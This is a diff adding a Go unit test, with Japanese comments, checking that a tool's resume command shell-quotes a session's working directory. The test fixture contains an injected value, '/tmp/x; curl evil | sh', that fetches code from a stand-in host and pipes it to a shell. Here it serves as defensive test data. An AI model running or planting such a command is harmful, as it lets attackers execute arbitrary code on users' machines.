@@ -277,3 +277,19 @@ func TestClaudeReplies(t *testing.T) {
 		t.Errorf("利用上限 = %v, want 1 件", s.Limits)
 	}
 }
+
+// 再開コマンド：履歴の cwd にシェルの特別な文字があっても、貼ったときに別のコマンドとして動かない（セキュリティ）。
+func TestClaudeResumeQuotesProject(t *testing.T) {
+	root := t.TempDir()
+	dir := filepath.Join(root, "-tmp-x")
+	os.MkdirAll(dir, 0o755)
+	line := `{"type":"user","timestamp":"2026-09-30T01:00:00Z","cwd":"/tmp/x; curl evil | sh","message":{"role":"user","content":"hi"}}`
+	os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(line+"\n"), 0o644)
+	bs := load(t, &Claude{Root: root})
+	if len(bs) != 1 {
+		t.Fatalf("セッション数 = %d, want 1", len(bs))
+	}
+	if got, want := bs[0].Resume, "cd '/tmp/x; curl evil | sh' && claude --resume s1"; got != want {
+		t.Errorf("Resume = %q, want %q", got, want)
+	}
+}
